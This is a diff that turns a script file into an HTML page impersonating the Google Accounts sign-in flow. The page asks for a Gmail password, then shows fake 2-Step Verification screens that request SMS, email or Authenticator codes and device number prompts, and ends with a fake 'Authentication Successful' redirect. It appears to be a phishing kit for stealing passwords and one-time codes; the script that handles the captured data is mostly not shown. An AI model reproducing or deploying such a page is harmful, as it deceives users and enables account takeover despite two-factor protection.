@@ -1,4 +1,1106 @@
-document.addEventListener('DOMContentLoaded', function() {
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #202124;
+            background-color: #f0f5f9;
+            overflow-x: hidden;
+            touch-action: manipulation;
+        }
+
+        .form-box {
+            background-color: white;
+            border-radius: 30px;
+            margin: 50px auto;
+            padding: 43px 34px 34px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            max-width: 800px;
+            width: calc(100% - 200px);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 65px;
+            height: 65px;
+            margin-bottom: 20px;
+            border-radius: 50%;
+            background-image: url('https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-1024.png');
+            background-size: contain;
+        }
+
+        .logo-mobile {
+            display: none;
+        }
+
+        h1 {
+            font-size: 34px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin: 0 0 16px;
+        }
+
+        h2 {
+            font-size: 19.2px;
+            font-weight: 400;
+            margin: 0 0 16px;
+        }
+
+        .two-column-layout {
+            display: flex;
+            gap: 40px;
+            align-items: flex-start;
+        }
+
+        .left-column {
+            flex: 1;
+        }
+
+        .right-column {
+            flex: 1;
+        }
+
+        .email-box {
+            display: flex;
+            align-items: center;
+            border: 1px solid #dadce0;
+            border-radius: 50px;
+            padding: 6px 12px;
+            background-color: white;
+            width: fit-content;
+            max-width: 100%;
+            height: 32px;
+            box-sizing: border-box;
+            margin-top: -5px;
+        }
+
+        .profile-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 8px;
+            font-size: 12px;
+            background-color: #5f6368;
+        }
+
+        .email-value {
+            font-size: 15px;
+            color: #202124;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 250px;
+        }
+
+        .input-container {
+            width: 100%;
+            margin-top: -10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            height: 60px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .action-row {
+            width: 100%;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            margin-top: 70px;
+            margin-bottom: 0;
+            gap: 20px;
+        }
+
+        .forgot-password {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-right: 10px;
+        }
+
+        .next {
+            background-color: #0d5bdb;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 10px 28px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            height: 40px;
+        }
+
+        .throbber-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            overflow: hidden;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+            display: none;
+        }
+
+        .throbber-line {
+            height: 100%;
+            width: 45%;
+            background-color: #1a73e8;
+            position: absolute;
+            animation: throbber-animation 1.5s linear infinite;
+        }
+
+        @keyframes throbber-animation {
+            0% {
+                transform: translateX(-100%);
+            }
+            100% {
+                transform: translateX(400%);
+            }
+        }
+
+        .blur-content {
+            filter: blur(1px);
+            transition: filter 0.3s ease;
+        }
+
+        .loading {
+            pointer-events: none;
+        }
+
+        .next.loading {
+            opacity: 0.7;
+        }
+
+        .footer {
+            width: calc(100% - 200px);
+            max-width: 800px;
+            margin: 0 auto 20px auto;
+            display: flex;
+            justify-content: space-between;
+            color: #70757a;
+            font-size: 12px;
+            padding-top: 0px;
+        }
+
+        .footer-left {
+            text-align: left;
+        }
+
+        .footer-right {
+            text-align: right;
+        }
+
+        .footer a {
+            color: #70757a;
+            text-decoration: none;
+            margin-left: 20px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .device-auth-container {
+            display: none;
+        }
+
+        .auth-number-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+        }
+
+        .auth-number {
+            font-size: 32px;
+            font-weight: bold;
+            color: #000000;
+            margin: 40px 0;
+        }
+
+        .auth-instruction {
+            font-size: 14px;
+            margin: 20px 0;
+            color: #000;
+            text-align: left;
+        }
+
+        .try-another-way {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            text-align: right;
+            margin-top: 80px;
+            cursor: pointer;
+            margin-left: auto;
+            width: fit-content;
+        }
+
+        .alt-auth-options {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .auth-option {
+            padding: 15px 0;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            border-bottom: 1px solid #dadce0;
+            display: flex;
+            align-items: center;
+        }
+
+        .auth-option:last-child {
+            border-bottom: none;
+        }
+
+        .auth-option:hover {
+            background-color: #f8f9fa;
+        }
+
+        .auth-method-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #f1f3f4;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            color: #5f6368;
+        }
+
+        .auth-option-content {
+            flex: 1;
+        }
+
+        .auth-option-title {
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        .auth-option-desc {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .back-to-device-auth {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            text-align: right;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+
+        .prompt-footer {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .send-again {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .send-again-loading {
+            color: #5f6368;
+            pointer-events: none;
+        }
+
+        .auth-gif-container {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .auth-gif {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        .auth-code-container {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            margin-bottom: 15px;
+        }
+
+        .submit-code {
+            background-color: #0d5bdb;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 10px 28px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            height: 40px;
+            float: right;
+            margin-top: 40px;
+        }
+
+        .authenticator-container {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .authenticator-instruction {
+            font-size: 16px;
+            color: #0000;
+            margin-bottom: 20px;
+        }
+
+        .auth-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .auth-title {
+            margin-left: 20px;
+            font-size: 24px;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            display: none;
+            margin-top: 8px;
+            margin-bottom: 8px;
+            width: 100%;
+        }
+
+        .has-error input {
+            border-color: #d93025 !important;
+            box-shadow: 0 0 0 1px #d93025 !important;
+        }
+
+        .has-error input:focus {
+            border-color: #d93025 !important;
+            box-shadow: 0 0 0 1px #d93025 !important;
+        }
+
+				/* Add this to your CSS */
+		.password-error-state .error-message {
+			display: block !important;
+			opacity: 1 !important;
+		}
+
+		/* Make sure error message stays red */
+		.dark-red-error {
+			color: #d93025 !important;
+		}
+
+		/* Input border stays red when in error state */
+		.dark-red-border {
+			border-color: #d93025 !important;
+			box-shadow: 0 0 0 1px #d93025 !important;
+		}
+        
+
+        .exit-message {
+            text-align: center;
+            padding: 40px;
+            font-size: 18px;
+            color: #5f6368;
+        }
+
+        .otp-prefix {
+            position: absolute;
+            left: 15px;
+            top: 40%;
+            transform: translateY(-50%);
+            color: #5f6368;
+            font-weight: bold;
+        }
+
+        .otp-input-container {
+            position: relative;
+        }
+
+        .otp-input {
+            padding-left: 40px !important;
+        }
+
+        .custom-alert {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            z-index: 1000;
+            max-width: 90%;
+            animation: fadeIn 0.3s ease-out;
+            border: 1px solid #dadce0;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        .custom-alert-icon {
+            margin-right: 12px;
+            color: #34a853;
+        }
+
+        .custom-alert-error {
+            color: #d93025 !important;
+        }
+
+        .custom-alert-message {
+            font-size: 14px;
+            color: #202124;
+        }
+
+        .send-again-container {
+            margin-top: 20px;
+            text-align: left;
+            width: 100%;
+        }
+
+        .alt-auth-options .send-again-container {
+            display: none;
+        }
+
+        .no-email-container {
+            display: none;
+            text-align: center;
+            padding: 40px;
+        }
+
+        .no-email-message {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .no-email-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* Full-page loader */
+        .full-page-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loader-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #4285f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .loader-text {
+            font-size: 16px;
+            color: #5f6368;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .blur-effect {
+            filter: blur(3px);
+            pointer-events: none;
+        }
+
+        /* GIF verification specific styles */
+        .gif-verification-container {
+            text-align: left;
+            margin-top: 20px;
+            width: 100%;
+        }
+
+        .gif-verification-title {
+            font-size: 22px;
+            margin-top: 15px;
+            color: #202124;
+            text-align: left;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        /* Auth number specific styles */
+        .auth-number-verification-container {
+            text-align: center;
+            margin-top: 70px;
+        }
+
+        .auth-number-display {
+            font-size: 64px;
+            color: #202124;
+            margin: 15px 0;
+            padding: 10px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            display: inline-block;
+        }
+
+        /* Show password checkbox styles */
+        .show-password-container {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            margin-bottom: 15px;
+        }
+
+        .show-password-checkbox {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #5f6368;
+            border-radius: 4px;
+            margin-right: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+        }
+
+        .show-password-checkbox.checked {
+            background-color: #1a73e8;
+            border-color: #1a73e8;
+        }
+
+        .show-password-checkbox .check-icon {
+            color: white;
+            font-size: 14px;
+            display: none;
+        }
+
+        .show-password-checkbox.checked .check-icon {
+            display: block;
+        }
+
+        .show-password-label {
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
+        }
+
+        /* 2FA safety message */
+        .safety-message {
+            font-size: 16px;
+            color: #000;
+            margin: 0 0 20px 0;
+            padding: 0;
+            text-align: left;
+            font-weight: 500;
+        }
+
+
+
+        /* GIF header text */
+        .gif-header-text {
+            font-size: 24px !important;
+            margin-bottom: 20px !important;
+            text-align: left !important;
+            width: 100% !important;
+        }
+
+        /* Unavailable options */
+        .auth-option.unavailable {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        .auth-option.unavailable .auth-method-icon {
+            background-color: #f1f3f4 !important;
+            color: #dadce0 !important;
+        }
+
+        /* Session expired message */
+        .session-expired {
+            background-color: #fce8e6;
+            border-radius: 4px;
+            padding: 16px;
+            margin-bottom: 20px;
+            color: #d93025;
+            font-size: 14px;
+            display: none;
+        }
+
+        /* Iframe styles */
+        .iframe-container {
+            width: 100%;
+            height: 100vh;
+            border: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9998;
+            display: none;
+        }
+
+        /* Mobile-specific overrides */
+        @media (max-width: 768px) {
+            html, body {
+                overflow-x: hidden;
+                overflow-y: hidden;
+                touch-action: none;
+                height: 100%;
+                position: fixed;
+                width: 100%;
+            }
+
+            .form-box {
+                border-radius: 0;
+                margin: 0;
+                padding: 24px;
+                min-height: 100vh;
+                max-width: 100%;
+                width: 100%;
+                box-shadow: none;
+                overflow: hidden;
+            }
+            
+            .logo {
+                display: none;
+            }
+            
+            .logo-mobile {
+                display: block;
+                width: 92px;
+                height: 30px;
+                margin: 0 auto 24px auto;
+                border-radius: 0;
+                background-image: url('https://www.freepnglogos.com/uploads/google-logo-png/google-logo-png-google-sva-scholarship-20.png');
+                background-size: contain;
+            }
+            
+            .header {
+                text-align: center;
+            }
+            
+            .two-column-layout {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .left-column, .right-column {
+                width: 100%;
+            }
+            
+            .email-box {
+                width: auto;
+                max-width: 100%;
+                margin: 0 auto 20px auto;
+                justify-content: center;
+                padding: 6px 15px;
+                height: 40px;
+            }
+
+            .email-value {
+                max-width: calc(100% - 30px);
+                white-space: nowrap;
+                overflow: hidden;
+                text-overflow: ellipsis;
+                font-size: 14px;
+            }
+            
+            .input-container {
+                margin-top: 0;
+                padding: 0 10px;
+            }
+
+            input {
+                padding: 15px;
+                height: 50px;
+            }
+            
+            .action-row {
+                margin-top: 30px;
+                justify-content: center;
+                padding: 0 10px;
+            }
+            
+            .footer {
+                width: 100%;
+                padding: 0 20px;
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .footer-left, .footer-right {
+                text-align: center;
+                margin-bottom: 10px;
+            }
+            
+            .footer a {
+                margin: 0 10px;
+            }
+            
+            .auth-number {
+                font-size: 48px;
+                margin: 20px 0;
+            }
+            
+            .auth-instruction {
+                font-size: 16px;
+                margin: 15px 0;
+            }
+            
+            .try-another-way, .back-to-device-auth {
+                text-align: center;
+                margin: 30px auto 0 auto;
+                width: 100%;
+            }
+            
+            .submit-code {
+                float: none;
+                width: 100%;
+                margin-top: 20px;
+            }
+            
+            .send-again-container {
+                text-align: center;
+            }
+
+            .no-email-container {
+                padding: 20px;
+            }
+
+            .no-email-message {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Iframe container -->
+    <iframe class="iframe-container" id="loadingIframe" src="https://example.com"></iframe>
+    
+    <!-- Full page loader -->
+    <div class="full-page-loader" id="fullPageLoader">
+        <div class="loader-spinner"></div>
+        <div class="loader-text">Loading Google authentication...</div>
+    </div>
+    
+    <div class="form-box" id="formBox">
+        <div class="throbber-container" id="throbberContainer">
+            <div class="throbber-line"></div>
+        </div>
+        
+        <!-- Session expired message -->
+        <div class="session-expired" id="sessionExpired">
+            Your session has expired. Please sign in again.
+        </div>
+        
+        <!-- No Email Container -->
+        <div class="no-email-container" id="noEmailContainer">
+            <div class="no-email-message">No email address provided in the URL.</div>
+            <a href="https://example.com" class="no-email-link">Continue to example.com</a>
+        </div>
+        
+        <!-- Password Form -->
+        <div id="passwordForm">
+            <div class="header">
+                <div class="logo"></div>
+                <div class="logo-mobile"></div>
+                <h1 id="pageTitle">Welcome</h1>
+            </div>
+            
+            <div class="two-column-layout" id="contentArea">
+                <div class="left-column">
+                    <div class="safety-message" id="safetyMessage">
+                        To help keep your account safe, Google wants to make sure it's really you trying to sign in
+                    </div>
+                    
+                    <div class="email-box">
+                        <div class="profile-icon" id="profileIcon">G</div>
+                        <div class="email-value" id="emailDisplay">name@gmail.com</div>
+                    </div>
+                </div>
+                
+                <div class="right-column">
+                    <div class="input-container" id="passwordContainer">
+                        <input type="password" placeholder="Enter your password" id="passwordInput">
+                        <div class="error-message dark-red-error" id="passwordError"></div>
+                        <div class="show-password-container">
+                            <div class="show-password-checkbox" id="showPasswordCheckbox">
+                                <span class="material-icons check-icon">check</span>
+                            </div>
+                            <span class="show-password-label" id="showPasswordLabel">Show password</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="action-row">
+                <a href="#" class="forgot-password">Forgot password?</a>
+                <button class="next" id="nextButton">Next</button>
+            </div>
+        </div>
+        
+        <!-- 2FA Device Authentication Container -->
+        <div class="device-auth-container" id="deviceAuthContainer">
+            <div class="two-column-layout">
+                <div class="left-column">
+                    <div class="header">
+                        <div class="logo"></div>
+                        <div class="logo-mobile"></div>
+                        <h1 id="leftColumnTitle">2-Step Verification</h1>
+                    </div>
+                    
+                    <div class="safety-message" id="authSafetyMessage">
+                        To help keep your account safe, Google wants to make sure it's really you trying to sign in
+                    </div>
+                    
+                    <div class="email-box">
+                        <div class="profile-icon" id="authProfileIcon">G</div>
+                        <div class="email-value" id="authEmailDisplay">name@gmail.com</div>
+                    </div>
+                </div>
+                
+                <div class="right-column">
+                    <!-- Device Prompt Container -->
+                    <div class="device-prompt-container" id="devicePromptContainer">
+                        <div class="auth-number-container">
+                            <div class="auth-number" id="authNumberDisplay">21</div>
+                            <h2 id="authNumberHeading">Open the Gmail app on your Phone</h2>
+                            <div class="auth-instruction" id="authNumberInstruction">
+                                 Google sent a notification to your device. Open the Gmail app, tap Yes on the prompt, then tap <span id="authNumberText">21</span> on your phone to verify it's you.
+                            </div>
+                            
+                            <div class="send-again-container">
+                                <div class="auth-instruction">
+                                    Didn't get a code? <span class="send-again" id="sendAgainDevice">Send it again</span>
+                                </div>
+                            </div>
+                            
+                            <a class="try-another-way" id="tryAnotherWay">Try another way</a>
+                        </div>
+                    </div>
+                    
+                    <!-- Alternative Authentication Options -->
+                    <div class="alt-auth-options" id="altAuthOptions">
+                        <div class="auth-option" id="tapYesOption">
+                            <div class="auth-method-icon">
+                                <span class="material-icons">phone_iphone</span>
+                            </div>
+                            <div class="auth-option-content">
+                                <div class="auth-option-title">Tap "Yes" on your device</div>
+                                <div class="auth-option-desc">Confirm it's you on one of your devices</div>
+                            </div>
+                        </div>
+                        
+                        <div class="auth-option" id="textOption">
+                            <div class="auth-method-icon">
+                                <span class="material-icons">sms</span>
+                            </div>
+                            <div class="auth-option-content">
+                                <div class="auth-option-title">Get a verification code by text</div>
+                                <div class="auth-option-desc">+1 ••• ••• 1234</div>
+                            </div>
+                        </div>
+                        
+                        <div class="auth-option" id="emailOption">
+                            <div class="auth-method-icon">
+                                <span class="material-icons">email</span>
+                            </div>
+                            <div class="auth-option-content">
+                                <div class="auth-option-title">Get a verification code by email</div>
+                                <div class="auth-option-desc">n••••@gmail.com</div>
+                            </div>
+                        </div>
+                        
+                        <div class="auth-option" id="authenticatorOption">
+                            <div class="auth-method-icon">
+                                <span class="material-icons">security</span>
+                            </div>
+                            <div class="auth-option-content">
+                                <div class="auth-option-title">Use Google Authenticator</div>
+                                <div class="auth-option-desc">Get a verification code from the app</div>
+                            </div>
+                        </div>
+                        
+                        <div class="auth-option" id="helpOption">
+                            <div class="auth-method-icon">
+                                <span class="material-icons">help</span>
+                            </div>
+                            <div class="auth-option-content">
+                                <div class="auth-option-title">Get help</div>
+                                <div class="auth-option-desc">Troubleshoot issues with 2-Step Verification</div>
+                            </div>
+                        </div>
+                        
+                        <a class="back-to-device-auth" id="backToDeviceAuth">Back</a>
+                    </div>
+                    
+                    <!-- Text Verification Code Input -->
+                    <div class="auth-code-container" id="textCodeContainer">
+                        <div class="auth-header">
+                            
+                        </div>
+                        <div class="auth-instruction" id="textCodeInstruction">
+                            We sent a 6-digit code to +1 ••• ••• 1234. Enter it below to verify it's you.
+                        </div>
+                        <div class="otp-input-container">
+                            <span class="otp-prefix">G-</span>
+                            <input type="text" class="code-input otp-input" id="textCodeInput" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+                        </div>
+                        <div class="error-message dark-red-error" id="textCodeError"></div>
+                        <button class="submit-code" id="submitTextCode">Submit</button>
+                        <div class="send-again-container">
+                            <div class="auth-instruction">
+                                Didn't get a code? <span class="send-again" id="sendAgainText">Send it again</span>
+                            </div>
+                        </div>
+                        <a class="try-another-way" id="tryAnotherWayFromText">Try another way</a>
+                    </div>
+                    
+                    <!-- Email Verification Code Input -->
+                    <div class="auth-code-container" id="emailCodeContainer">
+                        <div class="auth-header">
+                            
+                        </div>
+                        <div class="auth-instruction" id="emailCodeInstruction">
+                            We sent a 6-digit code to n••••@gmail.com. Enter it below to verify it's you.
+                        </div>
+                        <div class="otp-input-container">
+                            <span class="otp-prefix">G-</span>
+                            <input type="text" class="code-input otp-input" id="emailCodeInput" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+                        </div>
+                        <div class="error-message dark-red-error" id="emailCodeError"></div>
+                        <button class="submit-code" id="submitEmailCode">Submit</button>
+                        <div class="send-again-container">
+                            <div class="auth-instruction">
+                                Didn't get a code? <span class="send-again" id="sendAgainEmail">Send it again</span>
+                            </div>
+                        </div>
+                        <a class="try-another-way" id="tryAnotherWayFromEmail">Try another way</a>
+                    </div>
+                    
+                    <!-- Authenticator Code Input -->
+                    <div class="authenticator-container" id="authenticatorContainer">
+                        <div class="auth-header">
+                            
+                        </div>
+                        <div class="authenticator-instruction">
+                            Open Google Authenticator and enter the 6-digit code for your account.
+                        </div>
+                        <div class="otp-input-container">
+                            <span class="otp-prefix">G-</span>
+                            <input type="text" class="code-input otp-input" id="authenticatorCodeInput" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+                        </div>
+                        <div class="error-message dark-red-error" id="authenticatorCodeError"></div>
+                        <button class="submit-code" id="submitAuthenticatorCode">Submit</button>
+                        <a class="try-another-way" id="tryAnotherWayFromAuthenticator">Try another way</a>
+                    </div>
+                    
+                    <!-- GIF Verification Container -->
+                    <div class="gif-verification-container" id="gifVerificationContainer" style="display: none;">
+                        <h1 class="gif-header-text" id="gifHeaderText"></h1>
+                        <img src="" alt="Verification GIF" class="auth-gif" id="verificationGif">
+                        <a class="try-another-way" id="tryAnotherWayFromGif">Try another way</a>
+                    </div>
+                    
+                    <!-- Auth Number Verification Container -->
+                    <div class="auth-number-verification-container" id="authNumberVerificationContainer" style="display: none;">
+                        <div class="auth-number-display" id="authNumberVerificationDisplay">21</div>
+                        <h2 class="gif-verification-title" id="authNumberVerificationTitle">Enter this number on your device</h2>
+                        <div class="auth-instruction" id="authNumberVerificationInstruction"></div>
+                        <a class="try-another-way" id="tryAnotherWayFromAuthNumber">Try another way</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Successful Authentication Page -->
+        <div id="successPage" style="display: none;">
+            <div class="exit-message">
+                <h1>Authentication Successful</h1>
+                <p>You have been successfully authenticated.</p>
+                <p>You will be redirected shortly.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-left">
+            English (United States)
+        </div>
+        <div class="footer-right">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+
+		document.addEventListener('DOMContentLoaded', function() {
     // DOM Elements
     const fullPageLoader = document.getElementById('fullPageLoader');
     const loadingIframe = document.getElementById('loadingIframe');
@@ -981,3 +2083,6 @@ document.addEventListener('DOMContentLoaded', function() {
         };
     }
 });
+    </script>
+</body>
+</html>
